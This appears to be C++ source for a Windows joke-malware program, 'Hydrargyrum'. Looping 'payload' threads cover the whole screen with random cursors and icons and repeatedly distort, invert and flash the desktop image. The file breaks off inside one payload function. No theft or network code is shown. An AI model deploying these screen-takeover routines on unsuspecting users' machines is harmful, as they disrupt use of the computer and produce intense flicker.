#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include <time.h>
#include "GDIConfig.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#define RGBBRUSH (DWORD)0x1900ac010e

DWORD WINAPI DrawCursors(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc; HICON shifang; int size = 0;
    while (true) {
        HICON shifang = LoadCursor(0, IDC_APPSTARTING);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_ARROW);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_CROSS);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_HELP);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_IBEAM);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_NO);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZEALL);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZENESW);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZENS);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZENWSE);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZEWE);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_UPARROW);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_WAIT);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI DrawIcons(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), size = 0;
    while (true) {
        HICON shifang = LoadIcon(NULL, MAKEINTRESOURCE(32512 + rand() % 4));
        HDC hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI CursorBall(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 110, angle = 0, count = 0;
    int signX = 1, signY = 1, incrementor = 1, x = 10, y = 10;
    while (true) {
        x += (incrementor * signX), y += (incrementor * signY);
        HICON hIcon = LoadCursor(0, IDC_HELP);
        HDC hdc = GetDC(0);
        DrawIcon(hdc, x + (radius * cos(angle * 3.1415926 / 18)), y + (radius * sin(angle * 3.1415926 / 18)), hIcon);
        ReleaseDC(0, hdc);
        DestroyIcon(hIcon);
        DeleteObject(hIcon);
        DeleteDC(hdc);
        if (y >= h) { signY = -1; }
        if (x >= w) { signX = -1; }
        if (y <= 0) { signY = 1; }
        if (x <= 0) { signX = 1; }
        angle++;
        if (count == 10) {
            count = 0;
            Sleep(1);
        }
        else {
            count++;
        }
    }
}

DWORD WINAPI DrawTexts(LPVOID lpParam) {
    LPCSTR text = "Hydrargyrum", pszFaceName = "idk what to put here!";
    while (true) {
        int rdx = 1 + rand() % 3; int xxx = (rdx * 10) - 10;
        int cWidth = 50 - xxx, cHeight = 60 - xxx, tmp = rand() % 16, color = RGB(rand() % 255, rand() % 255, rand() % 255);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetTextColor(hdc, color);
        SetBkMode(hdc, 0);
        HFONT font = CreateFontA(cHeight, cWidth, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, pszFaceName);
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text, 11);
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(50);
    }
}

DWORD WINAPI BeautifulShell32Icons(LPVOID lpParam) {
    int radius = 32;
    double chushi = 1;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int numCircles = (h / (radius + 4.5)) * radius, count = 0;
        for (int i = 0; i < numCircles; i++) {
            int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * cos(i * 1.2), y = ((h / 2) + radius) + spiralRadius * sin(i * 1.2);
            HDC hdc = GetDC(0);
            HICON hIcon = ExtractIconA(0, "shell32.dll", rand() % 336);
            DrawIconEx(hdc, x, y, hIcon, 32, 32, NULL, NULL, DI_NORMAL);
            ReleaseDC(0, hdc);
            DestroyIcon(hIcon);
            if (count == 10) { count = 0; Sleep(1); }
            else { count++; }
        }
        if (chushi > 2.5) { chushi = 1; }
        else { chushi = chushi + 0.1; }
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI Payload1_num1(LPVOID lpParam) {
    int randy1 = 0, randy2 = 0;
    while (true) {
        randy2 = randy1, randy1 = (rand() % 180) + 30;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rgb = RGB(rand() % 255, rand() % 255, rand() % 255), randh = 20 + ((rand() % h) / 4);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(0, 0);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        if (randy2 != 0) {
            BitBlt(hcdc, 0, -randy2, w, h, hcdc, 0, 0, SRCCOPY);
            BitBlt(hcdc, 0, h - randy2, w, h, hcdc, 0, 0, SRCCOPY);
        }
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, -randy1, SRCCOPY);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, h - randy1, SRCCOPY);

        for (int y = 0; y < h; y += randh) {
            HBRUSH hBrush = CreateSolidBrush(rgb);
            SelectObject(hcdc, hBrush);
            StretchBlt(hcdc, 10 - (rand() % 20), y, w, randh, hcdc, 10 - (rand() % 20), y, w, randh, RGBBRUSH);
            DeleteObject(hBrush);
        }

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload2_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb -= ((i & w) + h) & ((i * 2) + (i / w));
        }
        BitBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, SRCAND);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(20);
    }
}

DWORD WINAPI Payload2_num2(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += 40) {
            StretchBlt(hcdc, x, -20 + rand() % 40, 40, h, hcdc, x, 0, 40, h, SRCAND);
        }
        for (int y = 0; y < h; y += 40) {
            StretchBlt(hcdc, -20 + rand() % 40, y, w, 40, hcdc, 0, y, w, 40, SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(20);
    }
}

DWORD WINAPI Payload3_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, 1, 1, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb *= i / w | i % h | w + h;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap); 
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(20);
    }
}

DWORD WINAPI Payload4_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, 1, 1, SRCCOPY);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, PATINVERT);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb *= (i % w & i) & i | (i / h) ^ i | i / 2;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap); DeleteObject(hBrush);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload5_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        int rgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (i & i % w ^ i & i / w) * rgb;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload6_num1(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        PRGBQUAD prgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int x = 0; x < w; x += 40) {
            for (int y = 0; y < h; y += 40) {
                StretchBlt(hcdc, x, y, 40, 40, hcdc, x, y, 25, 25, SRCCOPY);
            }
        }
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -1 + (rand() % 3), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        BitBlt(hcdc, 0, 0, w, h, hcdc, 20, 0, SRCCOPY);
        BitBlt(hcdc, 0, 0, w, h, hcdc, -w + 20, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            prgbScreen[i].rgb += i * 2 & i % w | i * 2 & i / h;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload7_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB};
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = (int)((i ^ 5) + (i * 5) * cbrt(i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(100);
    }
}

DWORD WINAPI Payload7_num2(LPVOID lpParam) {
    BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hcdc2 = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h), hBitmap2 = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap); SelectObject(hcdc2, hBitmap2);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY); BitBlt(hcdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 0, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc); ReleaseDC(0, hcdc2);
        DeleteObject(hBitmap); DeleteObject(hBitmap2);
        DeleteDC(hcdc); DeleteDC(hcdc2); DeleteDC(hdc);
        Sleep(250);
    }
}

DWORD WINAPI Payload8_num1(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y + x * h;
                double wave = cos((x + xxx) * 0.01) + sin((y + xxx) * 0.01);
                pBits[index].rgbRed = (512 * sin(wave) * 0.75);
                pBits[index].rgbGreen = (512 * tan(wave) * 1.25);
                pBits[index].rgbBlue = (512 * cos(wave) * 1.75);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 20;
        Sleep(1);
    }
}

DWORD WINAPI Payload9_num1(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x + y * w;
                double wave = sin((x + xxx) * 0.04) + cos((y + xxx) * 0.04);
                pBits[index].rgbRed += (256 * sin(wave) * 0.8);
                pBits[index].rgbGreen += (256 * cos(wave) * 0.8);
                pBits[index].rgbBlue += (256 * sin(wave) * 0.8);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 8;
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload10_num1(LPVOID lpParam) {
    BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, rand() % 4, rand() % 4, w, h, hcdc, rand() % 4, rand() % 4, SRCAND);
        BitBlt(hcdc, -1, 1, w, h, hcdc, 2, 2, SRCINVERT);
        BitBlt(hcdc, 1, -1, w, h, hcdc, -2, -2, SRCINVERT);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload11_num1(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), luckynum = 0, rndrgb = (RGB(rand() % 255, rand() % 255, rand() % 255)) * 2;
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= rndrgb; }
        luckynum = rand() % 10;
        if (luckynum >= 6) {
            BitBlt(hcdc, 0, 0, w - 20, h, hcdc, w - 20, 0, SRCCOPY);
            BitBlt(hcdc, 20, 0, w, h, hcdc, 0, 0, SRCCOPY);
        }
        else {
            BitBlt(hcdc, w - 20, 0, w - 20, h, hcdc, 0, 0, SRCCOPY);
            BitBlt(hcdc, -20, 0, w, h, hcdc, 0, 0, SRCCOPY);
        }
        luckynum = rand() % 10;
        if (luckynum >= 6) {
            BitBlt(hcdc, 0, 0, w, h - 20, hcdc, 0, h - 20, SRCCOPY);
            BitBlt(hcdc, 0, 20, w, h, hcdc, 0, 0, SRCCOPY);
        }
        else {
            BitBlt(hcdc, 0, h - 20, w, h - 20, hcdc, 0, 0, SRCCOPY);
            BitBlt(hcdc, 0, -20, w, h, hcdc, 0, 0, SRCCOPY);
        }

        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI Payload12_num1(LPVOID lpParam) {
    PRGBQUAD prgbScreen; int jingui = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int binggan = 1 + rand() % 25;
        for (int i = 0; i < w * h; i++) {
            prgbScreen[i].rgb *= ((jingui * binggan + i) / 5);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        jingui++;
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload12_num2(LPVOID lpParam) {
    int block_w = 80, block_h = 80;
    while (true) {
        int can1 = 1;
        int jia1 = 0, jia2 = 0, x = 0; int y = 0;
        int x1 = 0, y1 = 0, x2 = 0, y2 = 0;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BOOL bianliang1 = true;
        while (bianliang1) {
            jia1 = jia1 + block_w;
            if (jia1 > w) { bianliang1 = false; }
            else { can1 = can1 + 1; }
        }
        can1 = can1 + 1; bianliang1 = true;
        int can2 = 1;
        while (bianliang1) {
            jia2 = jia2 + block_h;
            if (jia2 > h) { bianliang1 = false; }
            else { can2 = can2 + 1; }
        }
        can2 = can2 + 1;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int jin = 0; jin < can2 + 1; jin++) {
            for (int gui = 0; gui < can1 + 1; gui++) {
                x = rand() % can1, y = jin;
                if (x == 1) { x1 = 0; }
                else if (x == 2) { x1 = block_w; }
                else { x1 = block_w * x - block_w; }

                if (y == 1) { y1 = 0; }
                else if (y == 2) { y1 = block_h; }
                else { y1 = block_h * y - block_h; }

                x = rand() % can1, y = rand() % can2;
                if (x == 1) { x2 = 0; }
                else if (x == 2) { x2 = block_w; }
                else { x2 = block_w * x - 1; }

                if (y == 1) { y2 = 0; }
                else if (y == 2) { y2 = block_h; }
                else { y2 = block_h * y - 1; }

                StretchBlt(hcdc, x1, y1, block_w, block_h, hcdc, x2, y2, block_w, block_h, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        jia1 = 0, jia2 = 0, can1 = 0, can2 = 0;
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI Payload13_num1(LPVOID lpParam) {
    int size = 25;
    BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += size) {
            for (int y = 0; y < h; y += size) {
                StretchBlt(hcdc, x, y, size, size, hcdc, x, y, size - 5, size - 5, SRCCOPY);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(20);
    }
    return 0;
}

DWORD WINAPI Payload13_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int size = 250; int rop = NULL;
    BLENDFUNCTION blf = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
